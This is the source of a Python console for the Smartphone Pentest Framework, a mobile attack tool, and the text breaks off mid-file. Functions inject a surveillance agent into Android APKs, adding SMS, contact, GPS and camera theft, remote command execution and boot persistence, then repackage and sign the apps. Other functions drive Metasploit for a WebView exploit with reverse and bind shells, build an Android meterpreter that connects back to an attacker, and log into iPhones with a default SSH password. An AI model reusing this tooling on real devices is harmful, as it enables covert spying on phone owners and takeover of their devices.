#!/usr/bin/python
version = "0.2.6"
import os
import sys
import re
import serial
import time
import struct
import pexpect
import socket
import zipfile
import xml.etree.ElementTree as ET
from lib.serial import read_modem
from lib.config import Config
from lib.db import DB, DBException
config = Config('config')

def shift(array):
    return array.pop(0)

def split(separator, string):
    return string.split(separator)

def substr(expr, offset, length):
    return expr[offset:][:length]

def main():
    print "################################################"
    print "#                                              #"
    print "# Welcome to the Smartphone Pentest Framework! #"
    print "#                   v" + version + "                     #"
    print "#         Georgia Weidman/Bulb Security        #"
    print "#                                              #"
    print "################################################"
    print
    print
    while True:
        print "Select An Option from the Menu:"
        print
        print "\t 1.)  Attach Framework to a Deployed Agent/Create Agent"
        print "\t 2.)  Send Commands to an Agent"
        print "\t 3.)  View Information Gathered"
        print "\t 4.)  Attach Framework to a Mobile Modem"
        print "\t 5.)  Run a remote attack"
        print "\t 6.)  Run a social engineering or client side attack"
        print "\t 7.)  Clear/Create Database"
        print "\t 8.)  Use Metasploit"
        print "\t 9.)  Compile code to run on mobile devices"
        print "\t10.)  Install Stuff"
        print "\t11.)  Use Drozer" 
	print "\t12.)  Setup API"
	print "\t 0.)  Exit"
        print
        print

        choice = raw_input('spf> ').strip().lower()
        print

        if choice == '1':
            agent_attach2()       
        if choice == '2':
            agent_control()
        if choice == '3':
            view_data()
        if choice == '4':
            add_modem()
        if choice == '5':
            remote_attack()
        if choice == '6':
            social()
        if choice == '7':
            database_clear()
        if choice == '8':
            metasplat()
        if choice == '9':
            compile()
	if choice == '10':
	    installstuff()
	if choice == '12':
	    api()
        if choice == "exit" or choice == '0':
            exit()

        print
        print '- '*3
        print

def make_files3(path):
    webserver = config.get("WEBSERVER")
    fullpath = webserver + path
    command1 = "mkdir " + fullpath
    os.system(command1)
    command11 = "chmod 777 " + fullpath
    os.system(command11) 
    getfuncfile = fullpath + "/getfunc"
    command6 = "touch " + getfuncfile
    os.system(command6)
    command7 = "chmod 777 " + getfuncfile
    os.system(command7)
    putfuncfile = fullpath + "/putfunc"
    command6 = "touch " + putfuncfile
    os.system(command6)
    command7 = "chmod 777 " + putfuncfile
    os.system(command7)
    getfuncupload = fullpath + "/getfuncuploader.php"
    command10 = "touch " + getfuncupload
    os.system(command10)
    command11 = "chmod 777 " + getfuncupload
    os.system(command11)
    getfuncuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('getfunc', 'wb');\nfwrite($file, $base);\n?>";
    GETFUNCUPLOADFILE = open(getfuncupload, 'w')
    GETFUNCUPLOADFILE.write(getfuncuploadtext)
    GETFUNCUPLOADFILE.close()
    putfuncupload = fullpath + "/putfuncuploader.php"
    command10 = "touch " + putfuncupload
    os.system(command10)
    command11 = "chmod 777 " + putfuncupload
    os.system(command11)
    putfuncuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('putfunc', 'wb');\nfwrite($file, $base);\n?>";
    PUTFUNCUPLOADFILE = open(putfuncupload, 'w')
    PUTFUNCUPLOADFILE.write(putfuncuploadtext)
    PUTFUNCUPLOADFILE.close()
def api():
  while True:
        print "\nConnect to a smartphone management app. You will need to supply the phone number,the control key, and the URL path\n"
        key = raw_input('Control Key: ').strip()
        path = raw_input('App URL Path: ').strip()

        correct = raw_input("\n\nControl Key: " + key + "\nURL Path: " + path  + "\nIs this correct?(y/N): ").strip().lower()
        if correct == "y":
            make_files3(path)
            startcommand = "python apipoller.py " + path + " " + key + " > log"
            pid = os.fork()
            if pid == 0:
                os.system(startcommand)
            break
def backdoor_srcmethod():
     while True:
          print "Puts the Android Agent inside an Android App APK. The application runs normally, with extra functionality."
          inputfile = raw_input('APK to Backdoor: ').strip()
          if inputfile == '0':
               break
          apktoolloc = config.get("APKTOOLLOC")
          apksloc = config.get("APKSLOC")
          os.chdir(apksloc)
          copycom = "cp -rf AndroidAgentBAK AndroidAgent"
          os.system(copycom) 
          decompile = apktoolloc + "/apktool d " + inputfile
          os.system(decompile)
          path,file = os.path.split(inputfile)
          foldername = file[:-4]
          ET.register_namespace("android", "http://schemas.android.com/apk/res/android")
          tree = ET.ElementTree()
          tree.parse(foldername + "/AndroidManifest.xml")
          root = tree.getroot()
          package = root.get('package')
          for child in root:
             if child.tag == "application":
                app = child
                for child in app:
                        if child.tag == "activity":
                                act = child
                                for child in act:
                                        if child.tag == "intent-filter":
                                                filter = child
                                                for child in filter:  
                                                        if (filter[0].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.category.LAUNCHER" or  filter[0].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.action.MAIN"):
                                                             if (filter[1].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.category.LAUNCHER" or  filter[1].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.action.MAIN"):
                                                                        mainact =  act.get('{http://schemas.android.com/apk/res/android}name')
                                                                        if mainact[0] == ".":
                                                                             mainact = package + mainact
                                                                        act.remove(filter)
                                                                        tree.write("output.xml")
                                                                        break
          movecommand = "mv output.xml " + foldername  + "/AndroidManifest.xml"
          os.system(movecommand)
          mainactsplit = mainact.split(".")
          length = len(mainactsplit)
          classname = mainactsplit[length - 1]
          package = mainactsplit[0] + "."
          for x in range(1, (length - 2)):
                 add = mainactsplit[x] + "."
          	 package += add
          package += mainactsplit[length - 2]
          appmain = package + "." + classname + ".class"
          mainfile = "AndroidAgent/src/com/bulbsecurity/framework/AndroidAgentActivity.java"
          inject = "\n        Intent intent2 = new Intent(getApplicationContext(), " + appmain +  ");\nstartActivity(intent2);\n"
          with open(mainfile, 'r') as f:
              fc = f.read()
          with open(mainfile, 'w') as f:
              f.write(re.sub(r'(finish)', r'%s\1'%inject, fc, count=1))
          newfolder = "src/" + mainactsplit[0] + "/"
          os.system("mkdir AndroidAgent/" + newfolder)
          for x in range(1, (length - 1)):
              add = mainactsplit[x] + "/"
              newfolder += add
              os.system("mkdir AndroidAgent/" + newfolder)  
          fullclasspath =  "AndroidAgent/" + newfolder + classname + ".java"
          os.system("touch " + fullclasspath)
          f = open(fullclasspath, 'w')
          line1 = "package " + package + ";\n"
          line2 = "import android.app.Activity;\n"
          line3 = "public class " + classname + " extends Activity {\n"
          line4 = "}\n"
          f.write(line1)
          f.write(line2)
          f.write(line3)
          f.write(line4)
          f.close()
          androidsdk = config.get("ANDROIDSDK")
          command = androidsdk + "/tools/android update project --name AndroidAgent" + " --path " + "AndroidAgent/"
          os.system(command)
          command = "ant -f " + "AndroidAgent" +  "/build.xml clean debug"
          os.system(command)
          decompile = apktoolloc + "/apktool d " + "AndroidAgent/bin/AndroidAgent-debug.apk" + " -o AndroidAgent2/"
          os.system(decompile)
          os.system("mkdir " + foldername + "/smali/com")
          os.system("cp -rf AndroidAgent2/smali/com/bulbsecurity " + foldername + "/smali/com/")
          os.system("mkdir " + foldername + "/smali/jackpal")
          os.system("cp -rf AndroidAgent2/smali/jackpal " + foldername + "/smali/")
          manifestfile = foldername + "/AndroidManifest.xml"
          inject = """
          <receiver android:name="com.bulbsecurity.framework.SMSReceiver">
          <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED" /></intent-filter>
          </receiver>
          <service android:name="com.bulbsecurity.framework.SMSService">
          </service>
          <receiver android:name="com.bulbsecurity.framework.ServiceAutoStarterr">
          <intent-filter ><action android:name="android.intent.action.BOOT_COMPLETED"></action></intent-filter>
          </receiver>
          <receiver android:name="com.bulbsecurity.framework.AlarmReceiver" android:process=":remote"></receiver>
          <service android:name="com.bulbsecurity.framework.CommandHandler">
          </service>
          <service android:name="com.bulbsecurity.framework.PingSweep">
          </service>
          <service android:name="com.bulbsecurity.framework.SMSGet">
          </service>
          <service android:name="com.bulbsecurity.framework.ContactsGet">
          </service>
          <service android:name="com.bulbsecurity.framework.InternetPoller">
          </service>
          <service android:name="com.bulbsecurity.framework.WebUploadService">
          </service>
          <service android:name="com.bulbsecurity.framework.PictureService">
          </service>
          <service android:name="com.bulbsecurity.framework.Download">
          </service>
          <service android:name="com.bulbsecurity.framework.Execute">
          </service>
          <service android:name="com.bulbsecurity.framework.GetGPS">
          </service>
	  <service android:name="com.bulbsecurity.framework.IPGet">
          </service>
          <service android:name="com.bulbsecurity.framework.Checkin">
          </service>
          <service android:name="com.bulbsecurity.framework.Listener"></service>
          <service android:name="com.bulbsecurity.framework.Phase1" android:process=":three">
          </service>
          <service android:name="com.bulbsecurity.framework.Phase2" android:process=":two">
          </service>
          <service android:name="com.bulbsecurity.framework.Exynos"></service>
          <service android:name="com.bulbsecurity.framework.Upload"></service>
          <activity android:name="com.bulbsecurity.framework.AndroidAgentActivity">
          <intent-filter>
          <action android:name="android.intent.action.MAIN" />
          <category android:name="android.intent.category.LAUNCHER" />
          </intent-filter>
          </activity>
          """
          with open(manifestfile, 'r') as f:
              fc = f.read()
          with open(manifestfile, 'w') as f:
              f.write(re.sub(r'(<\/application>)', r'%s\1'%inject, fc, count=1))
          inject = """
          <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
          <uses-permission android:name="android.permission.INTERNET" />
          <uses-permission android:name="android.permission.RECEIVE_SMS"/>
          <uses-permission android:name="android.permission.SEND_SMS"/>
          <uses-permission android:name="android.permission.CAMERA"/>
          <uses-permission android:name="android.permission.READ_CONTACTS"/>
          <uses-permission android:name="android.permission.INTERNET"/>
          <uses-permission android:name="android.permission.READ_SMS"/>
          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
          <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
          <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
          <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
          <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
          <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
          """
          with open(manifestfile, 'r') as f:
               fc = f.read()
          with open(manifestfile, 'w') as f:
               f.write(re.sub(r'(<uses-permission)', r'%s\1'%inject, fc, count=1))
          stringfile = foldername + "/res/values/strings.xml" 
          inject = """
          <string name="key">KEYKEY1</string>
          <string name="controlnumber">155552155554</string>
          <string name="controlIP">192.168.1.108</string>
          <string name="urii">/control</string>
          <string name="controlpath">/androidagent1</string>
          """
          if os.path.exists(stringfile):
               with open(stringfile, 'r') as f:
                    fc = f.read()
               with open(stringfile, 'w') as f:
                    f.write(re.sub(r'(<\/resources>)', r'%s\1'%inject, fc, count=1))
          else:
               inject2 = """
               <?xml version="1.0" encoding="utf-8"?>
               <resources>
               """
               os.system("touch " + stringfile)
               with open(stringfile, 'w') as f:
                  f.write(inject2)  
                  f.write(inject)
                  f.write("</resources>")
          while True: 
             controlphone = raw_input('Phone number of the control modem for the agent: ').strip()
             controlkey = raw_input('Control key for the agent: ').strip()
             controlpath = raw_input('Webserver control path for agent: ').strip()
             print
             print
             print "Control Number:" + controlphone 
             print "Control Key:" + controlkey
             print "ControlPath:" + controlpath
             correct = raw_input("Is this correct?(y/n) ").strip().lower()
             if correct == 'y':
                ipaddress = config.get("IPADDRESS")
                fullpath1 = apksloc + "/" + foldername + "/res/values/strings.xml"
                command = "sed -i \'s/<string name=\"key\">.*/<string name=\"key\">" + controlkey + "<\\/string>/' " + fullpath1
                os.system(command)
                command = "sed -i \'s/<string name=\"controlnumber\">.*/<string name=\"controlnumber\">" + controlphone + "<\\/string>/' " + fullpath1
                os.system(command)
                command = "sed -i \'s/<string name=\"controlIP\">.*/<string name=\"controlIP\">" + ipaddress + "<\\/string>/' " + fullpath1
                os.system(command)
                command = "sed -i \'s/<string name=\"controlpath\">.*/<string name=\"controlpath\">\\" + controlpath + "<\\/string>/' " + fullpath1
                os.system(command)
		break
          xml_path = foldername + '/res/values/styles.xml'
          if os.path.exists(xml_path):
              tree = ET.parse(xml_path)
              for child in tree.findall('.//*[@parent]'):
                    if child.get('parent').startswith('@*android:style/'):
                        new_parent = child.get('parent').replace('@*android:style/','@android:style/')
                        child.set('parent', new_parent)
              tree.write(xml_path)
          os.environ["PATH"] = os.environ["PATH"] + ":" + apktoolloc
          compile = apktoolloc + "/apktool b " + foldername + " -o Backdoored/" + foldername + ".apk"
          os.system(compile)
          remove = "rm -rf " + foldername 
          os.system(remove)
          decomp = apktoolloc + "/apktool d Backdoored/" + foldername + ".apk -o" + foldername + "/"   
          os.system(decomp)
          tree = ET.ElementTree()
          tree.parse(foldername + "/res/values/public.xml")
          root = tree.getroot()
          for child in root:
              if (child.get('name') == "key" ):
                  newkeyvalue = child.get('id')
              if (child.get('name') == "urii" ):
                  newuriivalue = child.get('id')
              if (child.get('name') == "controlIP" ):
                  newcontrolIPvalue = child.get('id')
              if (child.get('name') == "controlnumber" ):
                  newcontrolnumbervalue = child.get('id')
              if (child.get('name') == "controlpath" ):
                  newcontrolpathvalue = child.get('id')
          oldkeyvalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep key | cut -d" " -f7').read().strip()
          olduriivalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep urii | cut -d" " -f7').read().strip()
          oldcontrolIPvalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep controlIP | cut -d" " -f7').read().strip()
          oldcontrolpathvalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep controlpath | cut -d" " -f7').read().strip()
          oldcontrolnumbervalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep controlnumber | cut -d" " -f7').read().strip()
          for dname, dirs, files in os.walk(foldername + "/smali/com/bulbsecurity/framework"):
              for fname in files:
                  fpath = os.path.join(dname, fname)
                  with open(fpath) as f:
                    s = f.read()
                    s = s.replace(oldkeyvalue, newkeyvalue)
                    s = s.replace(olduriivalue, newuriivalue)
                    s = s.replace(oldcontrolIPvalue, newcontrolIPvalue)
                    s = s.replace(oldcontrolpathvalue, newcontrolpathvalue)
                    s = s.replace(oldcontrolnumbervalue, newcontrolnumbervalue)
                  with open(fpath, "w") as f:
                    f.write(s)
          xml_path = foldername + '/res/values/styles.xml'
          if os.path.exists(xml_path):
              tree = ET.parse(xml_path)
              for child in tree.findall('.//*[@parent]'):
                  if child.get('parent').startswith('@*android:style/'):
                      new_parent = child.get('parent').replace('@*android:style/','@android:style/')
                      child.set('parent', new_parent)
              tree.write(xml_path)
          remove = "rm Backdoored/" + foldername + ".apk"
          os.system(remove)
          compile = apktoolloc + "/apktool b " + foldername + " Backdoored/" + foldername + ".apk"
          os.system(compile)
          signing = raw_input('Use Android Master Key Vuln?(y/N): ').strip().lower()
          if signing == "n":      
                debugkeyloc = config.get("DEBUGKEYLOC")
                print "Password for Debug Keystore is android"
                signcommand =  "jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore " + debugkeyloc +  "/debug.keystore Backdoored/" + foldername + ".apk " +  "androiddebugkey"
                os.system(signcommand)
                androidagentlocation = config.get("ANDROIDAGENT")
                copycommand = "cp Backdoored/" + foldername + ".apk " +androidagentlocation
                os.system(copycommand)
          if signing == "y":
                unzipcom = "unzip " + inputfile + " -d unzipped/"
                os.system(unzipcom)
                os.chdir("unzipped")
                currentdir = os.getcwd()
                zip = zipfile.ZipFile("../Backdoored/" + foldername + ".apk", "a")
                for root, subFolders, files in os.walk(currentdir):
                        for file in files:
                                file2 = os.path.join(root.replace(currentdir, "", 1), file).lstrip('/')
                                zip.write(file2)
                zip.close()
                os.chdir("..")
                androidagentlocation = config.get("ANDROIDAGENT")
                copycommand = "cp Backdoored/" + foldername + ".apk " +androidagentlocation
                os.system(copycommand)
                remove = "rm -rf unzipped"
                os.system(remove)
          rem = "rm -rf " + foldername
          os.system(rem)
          rem = "rm -rf AndroidAgent"
          os.system(rem)
          rem = "rm -rf AndroidAgent2"
          os.system(rem)
          consoleloc = config.get("CONSOLELOC")
          os.chdir(consoleloc)
          break


def backdoor_apk():
     apktoolloc = config.get("APKTOOLLOC")
     apktool = apktoolloc + "/apktool"

     if os.path.exists(apktool):
        backdoor_srcmethod()
     else:
        print "APKTool not found! Is it installed? Check your config file"
        installapktool()
        backdoor_srcmethod()

def installstuff():
    while True:
        print "What would you like to Install?"
        print "\t1.) Android SDKS"
        print "\t2.) Android APKTool"
	print "\t3.) Download Android Nmap"
        choice = raw_input('spf> ').strip()
        print
        if choice == '1':
            installandroid()
        if choice == '2':
            installapktool()
	if choice == '3':
	    installandroidnmap()
	if choice == '0':
            break
def installandroidnmap():
	print "Download Nmap for Android(y/N)?"
        choice = raw_input('spf> ').strip()
	print 
	if choice == 'y':
		download = "wget http://ftp.linux.hr/android/nmap/nmap-5.61TEST4-android-arm-bin.tar.bz2"
		os.system(download)
		bunzipper = "bunzip2 nmap-5.61TEST4-android-arm-bin.tar.bz2"
		os.system(bunzipper)
		tarer = "tar xvf nmap-5.61TEST4-android-arm-bin.tar"
		os.system(tarer)
		movenmap = "mv nmap-5.61TEST4 ../"
        	os.system(movenmap)

def installapktool():
    print "Install Android APKTool(y/N)?"
    choice = raw_input('spf> ').strip()
    print
    if choice == 'y':
            #downloadhelper = "wget https://android-apktool.googlecode.com/files/apktool-install-linux-r05-ibot.tar.bz2"
            downloadhelper = "wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.0.0.jar"
	    os.system(downloadhelper)
	    downloadhelper2 = "wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool"
	    os.system(downloadhelper2)
	    chmod1 = "chmod +x apktool"
            os.system(chmod1)
	    move1 = "mv apktool_2.0.0.jar apktool.jar"
	    os.system(move1)
	    #bunziphelper = "bunzip2 apktool-install-linux-r05-ibot.tar.bz2"
            #os.system(bunziphelper)
	    #tarhelper = "tar xvf apktool-install-linux-r05-ibot.tar"
            #os.system(tarhelper)
	    #downloadapktool = " wget https://android-apktool.googlecode.com/files/apktool1.5.2.tar.bz2"
            #os.system(downloadapktool)
            #bunzipapktool = "bunzip2 apktool1.5.2.tar.bz2"
            #os.system(bunzipapktool)
            #tarapktool = "tar xfv apktool1.5.2.tar"
            #os.system(tarapktool)
	    #moveapktool = "mv apktool1.5.2/apktool.jar apktool-install-linux-r05-ibot/"
            #os.system(moveapktool)
	    #moveapktool2 = "mv apktool-install-linux-r05-ibot ../"
	    #os.system(moveapktool2)

def installandroid():
    while True:
        print "Installed SDKs:"
        sdkloc = config.get("ANDROIDSDK")
        installedcommand = sdkloc + "/tools/android list target | grep id: | cut -d\" \" -f 4"
	os.system(installedcommand)
	print "Available SDKs:"
        newcommand = sdkloc + "/tools/android list sdk"
        os.system(newcommand)
        print "Which SDK Would You Like to Install?"
        choice = raw_input('spf> ').strip()
        print
        if choice == '0':
            break
        installcommand = sdkloc + "/tools/android update sdk --no-ui --filter " + choice
        os.system(installcommand) 

def compile():
    while True:
        print "Compile code to run on mobile devices"
        print "\t1.) Compile C code for ARM Android"
        choice = raw_input('spf> ')
        print
    
        if choice == '1':
             compileandroid()
	     break

        elif choice == '0':
             break

def compileandroid():
    androidarmloc = config.get("ANDROIDARMLOC")
    print "Compiles C code to run on ARM based Android devices. Supply the C code file and the output filename"
    inputfile = raw_input('File to Compile: ').strip()
    outputfile = raw_input('Output File: ').strip()

    compilecommand = androidarmloc + "/bin/arm-linux-androideabi-gcc -static " + inputfile + " -o " + outputfile
    os.system(compilecommand)

def metasplat():
    print "Runs smartphonecentric Metasploit modules for you.\n"
    while 1:
        print "Select An Option from the Menu:"
        print
        print "\t1.) Run iPhone Metasploit Modules"
        print "\t2.) Create Android Meterpreter"
	print "\t3.) Setup Metasploit Listener"
        print "\t4.) Run Android Metasploit Modules"
	choice = raw_input('spf> ').strip()
        print
        if choice == '1':
            iphone_meta()
            break
        if choice == '2':
	     androidmeterpreter()
	     break
        if choice == '3':
	     metalistener()
	     break
        if choice == '4':
	     androidmetasploit()
        if choice == '0':
            break

def androidmetasploit():
   metaloc = config.get("METASPLOITLOC")
   msfcli = metaloc + "/msfcli"
   if os.path.exists(msfcli):
       while True:
            print "Select An Exploit:"
            print
            print "\t1.) Browser Webview Add Javascript Interface "
            choice = raw_input('spf> ').strip()
            print

            if choice == '1':
                metadaddjavascriptinterface(metaloc)
                break
            if choice == '0':
                break

   else:
        print "Metasploit not found! Is it installed? Check your config file."

def metalistener():
    metaloc = config.get("METASPLOITLOC")
    msfcli = metaloc + "/msfcli"
    if os.path.exists(msfcli):
        while True:
            print "Open Android Meterpreter Listener"
            print
            lhost = raw_input('IP to connect back to:').strip()
            lport = raw_input('Port to connect back to:').strip()
            correct = raw_input('Is this correct(y/N):').strip()
            if correct == 'y':
                break
    os.system(msfcli + " multi/handler payload=android/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " E")
def metadaddjavascriptinterface(metaloc):
    moduletree = config.get("METAMODULES")
    modulename = moduletree + "/exploits/android/browser/webview_addjavascriptinterface.rb"
    print modulename
    if os.path.exists(modulename):
	print "Client side exploit for Android < 4.2. Exploits a privilege escalation issue in Android < 4.2's WebView component that arises when untrusted Javascript code is executed by a WebView that has one or more Interfaces added to it. Tested on Google APIs 4.2.1"
	serverport = raw_input('Server Port[8080]: ').strip()
	if serverport == "":
		serverport = "8080"
	uripath = raw_input('Server URL[SPF]: ').strip()
	if uripath == "":
                uripath = "SPF"
        usessl = raw_input('Use SSL?[y/N]: ').strip().lower()
        if usessl == 'y':
              sslcert = raw_input('Use your own SSL cert[y/N]: ').strip().lower()
              if sslcert == 'y':
                  pathtosslcert = raw_input('Path to SSL cert: ').strip()
              sslversion = raw_input('SSL Version(,SSL2, SSL3, TLS1)[SSL3]: ').strip()
	      if sslversion == "":
		  sslversion = "SSL3"
        serverhost = config.get("IPADDRESS")
	argstring = "URIPATH=" + uripath + " SRVHOST=" + serverhost + " SRVPORT=" + serverport + " " 
        if usessl == 'y':
	     argstring += "SSL=true SSLVersion=" + sslversion + " "
             if sslcert == 'y':
		argstring += "SSLCert=" + pathtosslcert + " " 
               
	while 1:
         print "Select A Compatible Payload:"
         print
         print "\t1.) ARM Linux Execute Command"
         print "\t2.) Android Bind Command Shell"
         print "\t3.) Android Reverse Command Shell"
         choice = raw_input('spf> ').strip()
         print
         if choice == '1':
            payload = "linux/armle/exec" 
	    cmd = raw_input('Command to Execute: ').strip()
	    payloadstring = "payload=" + payload + " cmd=" + cmd + " " 
	    os.system(metaloc + "/msfcli android/browser/webview_addjavascriptinterface " + argstring + payloadstring + "E")
            break
         if choice == '2':
             payload = "linux/armle/shell_bind_tcp"
	     lport = raw_input('Local Port on Device to open shell[4444]: ').strip()
	     if lport == "":
		lport = "4444"
	     payloadstring = "payload=" + payload + " lport=" + lport + " "
	     os.system(metaloc + "/msfcli android/browser/webview_addjavascriptinterface " + argstring + payloadstring + "E")
             break
         if choice == '3':
             payload = "linux/armle/shell_reverse_tcp"
             lport = raw_input('Local Port on SPF to listen for incoming connection[4444]: ').strip()
	     if lport == "":
		lport = "4444"
	     lhost = config.get("SHELLIPADDRESS")
	     payloadstring = "payload=" + payload + " lport=" + lport + " lhost=" + lhost + " " 
	     os.system(metaloc + "/msfcli android/browser/webview_addjavascriptinterface " + argstring + payloadstring + "E")
	     break
         if choice == '0':
	     break    
    else :
	print "Module not found. Would you like me to run Msfupdate for you(y/N)?"
        choice = raw_input('spf> ').strip().lower()
        print
        if choice == 'y':
		updatemetasploit()
def updatemetasploit():
    metaloc = config.get("METASPLOITLOC")
    msfupdate = metaloc + "/msfupdate"
    os.system(msfupdate)

def androidmeterpreter():
    metaloc = config.get("METASPLOITLOC")
    msfvenom = metaloc + "/msfvenom"
    metapp = config.get("ANDROIDMETERPRETER")
    if os.path.exists(msfvenom):
	while True:
	    print "Generate Android Meterpreter"
	    print 
            lhost = raw_input('IP to connect back to:').strip()
	    lport = raw_input('Port to connect back to:').strip()
	    correct = raw_input('Is this correct(y/N):').strip()
	    if correct == 'y':
		break
        os.system(msfvenom + " -p android/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f raw > " + metapp) 
    else:
        print "Metasploit not found! Is it installed? Check your config file."	
def iphone_meta():
    metaloc = config.get("METASPLOITLOC")
    msfcli = metaloc + "/msfcli"

    if os.path.exists(msfcli):
        while True:
            print "Select An Exploit:"
            print
            print "\t1.) Cydia Default SSH Password"
            print "\t2.) Email LibTiff iOS 1"
            print "\t3.) MobileSafari LibTiff iOS 1"
            choice = raw_input('spf> ').strip()
            print

            if choice == '1':
                metadefaultpassword(metaloc)
                break

            if choice == '2':
                metaemaillibtiff()
                break

            if choice == '3':
                metaemaillibtiff()
                break

            if choice == '0':
                break
    else:
        print "Metasploit not found! Is it installed? Check your config file."

def metadefaultpassword(metaloc):
    print "Logs in with alpine on a jailbroken iPhone with SSH enabled."
    rhost = raw_input('iPhone IP address: ').strip()
    os.system(metaloc + "/msfcli exploit/apple_ios/ssh/cydia_default_ssh RHOST=" + rhost + " E")

def metaemaillibtiff():
    print "This is for ios 1. I haven't bothered to implement it"

def agent_attach2():
    while True:
        print "Select An Option from the Menu:"
        print
        print "\t1.) Attach Framework to a Deployed Agent"
        print "\t2.) Generate Agent App"
        print "\t3.) Copy Agent to Web Server"
        print "\t4.) Import an Agent Template"
        print "\t5.) Backdoor Android APK with Agent"
        print "\t6.) Create APK Signing Key"
        choice = raw_input('spf> ').strip()
        if choice == '1':
            agent_attach()
            break

        if choice == '2':
            choose_build()
            break

        if choice == '3':
            copy_agent()
            break

        if choice == '4':
            import_template()
            break

        if choice == '5':
	    backdoor_apk()
            break

	if choice == '6':
	    key_maker()
	    break 

        if choice == '0':
            break

def import_template():
    tempdir = config.get("ANDROIDTEMP")
    ipaddress = config.get("IPADDRESS")
    androidagentlocation = config.get("ANDROIDAGENT")
    androidsdk = config.get("ANDROIDSDK")
    print "Imports source code to backdoor with Agent code"
    source = raw_input('Source Folder: ').strip()
    projectname = raw_input('Project Name: ').strip()
    ET.register_namespace("android", "http://schemas.android.com/apk/res/android")
    tree = ET.ElementTree()
    tree.parse(source + "/AndroidManifest.xml")
    root = tree.getroot()
    for child in root:
             if child.tag == "application":
                app = child
                for child in app:
                        if child.tag == "activity":
                                act = child
                                for child in act:
                                        if child.tag == "intent-filter":
                                                filter = child
                                                for child in filter:  
                                                        if (filter[0].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.category.LAUNCHER" or  filter[0].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.action.MAIN"):
                                                                if (filter[1].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.category.LAUNCHER" or  filter[1].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.action.MAIN"):
                                                                        mainact =  act.get('{http://schemas.android.com/apk/res/android}name')

    #mainact = raw_input('Main Activity including package(ex: com.example.demo.MainActivity): ').strip()

    command = "cp -rf " + source + " " + tempdir + "/" + projectname
    os.system(command)

    mainact = mainact.replace('.', '/')
    mainfile = tempdir + "/" + projectname + "/src/" + mainact + ".java"

    inject = "\n        Intent intent2 = new Intent(getApplicationContext(), com.bulbsecurity.framework.AndroidAgentActivity.class);\n\
        startActivity(intent2);\n"

    with open(mainfile, 'r') as f:
        fc = f.read()
    with open(mainfile, 'w') as f:
        f.write(re.sub(r'(onCreate\s*\([^{]+{)', r'\1\n%s'%inject, fc, count=1))
    
    manifestfile = tempdir + "/" + projectname + "/AndroidManifest.xml"

    inject = """
    <receiver android:name="com.bulbsecurity.framework.SMSReceiver">
    <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED" /></intent-filter>
    </receiver>
    <service android:name="com.bulbsecurity.framework.SMSService">
    </service>
    <receiver android:name="com.bulbsecurity.framework.ServiceAutoStarterr">
    <intent-filter ><action android:name="android.intent.action.BOOT_COMPLETED"></action></intent-filter>
    </receiver>
    <receiver android:name="com.bulbsecurity.framework.AlarmReceiver" android:process=":remote"></receiver>
    <service android:name="com.bulbsecurity.framework.CommandHandler">
    </service>
    <service android:name="com.bulbsecurity.framework.PingSweep">
    </service>
    <service android:name="com.bulbsecurity.framework.SMSGet">
    </service>
    <service android:name="com.bulbsecurity.framework.ContactsGet">
    </service>
    <service android:name="com.bulbsecurity.framework.InternetPoller">
    </service>
    <service android:name="com.bulbsecurity.framework.GetIP">
    </service>
    <service android:name="com.bulbsecurity.framework.WebUploadService">
    </service>
    <service android:name="com.bulbsecurity.framework.PictureService">
    </service>
    <service android:name="com.bulbsecurity.framework.Download">
    </service>
    <service android:name="com.bulbsecurity.framework.Execute">
    </service>
    <service android:name="com.bulbsecurity.framework.GetGPS">
    </service>
    <service android:name="com.bulbsecurity.framework.Checkin">
    </service>
    <service android:name="com.bulbsecurity.framework.Listener"></service>
    <service android:name="com.bulbsecurity.framework.Phase1" android:process=":three">
    </service>
    <service android:name="com.bulbsecurity.framework.Phase2" android:process=":two">
    </service>
    <service android:name="com.bulbsecurity.framework.Exynos"></service>
    <service android:name="com.bulbsecurity.framework.Upload"></service>
    <activity android:name="com.bulbsecurity.framework.AndroidAgentActivity"/>
    """

    with open(manifestfile, 'r') as f:
        fc = f.read()
    with open(manifestfile, 'w') as f:
        f.write(re.sub(r'(<\/application>)', r'%s\1'%inject, fc, count=1))

    inject = """
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
